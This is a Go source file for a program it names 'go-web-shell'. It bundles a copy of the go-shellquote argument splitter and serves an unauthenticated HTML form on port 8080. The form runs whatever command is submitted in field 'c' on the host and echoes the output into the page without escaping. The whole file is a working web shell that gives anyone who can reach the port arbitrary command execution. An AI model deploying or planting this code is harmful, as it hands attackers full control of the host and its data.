package main

import (
	"unicode/utf8"
	"net/http"
	"os/exec"
	"strings"
	"errors"
	"bytes"
	"fmt"
	"log"
)

// kballard: go-shellquote

var (
	UnterminatedSingleQuoteError = errors.New("Unterminated single-quoted string")
	UnterminatedDoubleQuoteError = errors.New("Unterminated double-quoted string")
	UnterminatedEscapeError      = errors.New("Unterminated backslash-escape")
)

var (
	splitChars        = " \n\t"
	singleChar        = '\''
	doubleChar        = '"'
	escapeChar        = '\\'
	doubleEscapeChars = "$`\"\n\\"
)

func Split(input string) (words []string, err error) {
	var buf bytes.Buffer
	words = make([]string, 0)

	for len(input) > 0 {
		// skip any splitChars at the start
		c, l := utf8.DecodeRuneInString(input)
		if strings.ContainsRune(splitChars, c) {
			input = input[l:]
			continue
		}

		var word string
		word, input, err = splitWord(input, &buf)
		if err != nil {
			return
		}
		words = append(words, word)
	}
	return
}

func splitWord(input string, buf *bytes.Buffer) (word string, remainder string, err error) {
	buf.Reset()

raw:
	{
		cur := input
		for len(cur) > 0 {
			c, l := utf8.DecodeRuneInString(cur)
			cur = cur[l:]
			if c == singleChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto single
			} else if c == doubleChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto double
			} else if c == escapeChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto escape
			} else if strings.ContainsRune(splitChars, c) {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				return buf.String(), cur, nil
			}
		}
		if len(input) > 0 {
			buf.WriteString(input)
			input = ""
		}
		goto done
	}

escape:
	{
		if len(input) == 0 {
			return "", "", UnterminatedEscapeError
		}
		c, l := utf8.DecodeRuneInString(input)
		if c == '\n' {
		} else {
			buf.WriteString(input[:l])
		}
		input = input[l:]
	}
	goto raw

single:
	{
		i := strings.IndexRune(input, singleChar)
		if i == -1 {
			return "", "", UnterminatedSingleQuoteError
		}
		buf.WriteString(input[0:i])
		input = input[i+1:]
		goto raw
	}

double:
	{
		cur := input
		for len(cur) > 0 {
			c, l := utf8.DecodeRuneInString(cur)
			cur = cur[l:]
			if c == doubleChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto raw
			} else if c == escapeChar {
				c2, l2 := utf8.DecodeRuneInString(cur)
				cur = cur[l2:]
				if strings.ContainsRune(doubleEscapeChars, c2) {
					buf.WriteString(input[0 : len(input)-len(cur)-l-l2])
					if c2 == '\n' {
					} else {
						buf.WriteRune(c2)
					}
					input = cur
				}
			}
		}
		return "", "", UnterminatedDoubleQuoteError
	}

done:
	return buf.String(), input, nil
}

// go-shellquote ends here.

func run_cmd( s string ) string {

	fmt.Println("exec:", s)

	args, _ := Split( s )

	// cmd := exec.Command( s )

	cmd := exec.Command( args[0], args[1:]... )

	var out bytes.Buffer
	var errorOutput bytes.Buffer

	cmd.Stdout = &out
	cmd.Stderr = &errorOutput

	err2 := cmd.Run()

	outputString := out.String()

	if err2 != nil {
		log.Println( err2 )
		return errorOutput.String()
	}

	outputString = strings.Replace( outputString, "\n", "<br />", -1 )

	return outputString
	
}

func handler(w http.ResponseWriter, r *http.Request) {

	fmt.Fprintf( w, "<!doctype html><head><meta charset=\"utf-8\" /><title>go-web-shell</title></head><body><form method=\"post\"><input type=\"text\" name=\"c\" id=\"c\" size=\"50\" /><br /><input type=\"submit\" value=\"Ok\" /></form><script>document.getElementById('c').focus();</script></body></html>" )

	if r.Method == "POST" {

		fmt.Println( r.FormValue("c") )

		input_cmd := r.FormValue("c")

		fmt.Fprintf( w, run_cmd( input_cmd )  )


	}

	
}

func main() {
	http.HandleFunc("/", handler)
	http.ListenAndServe(":8080", nil)
}
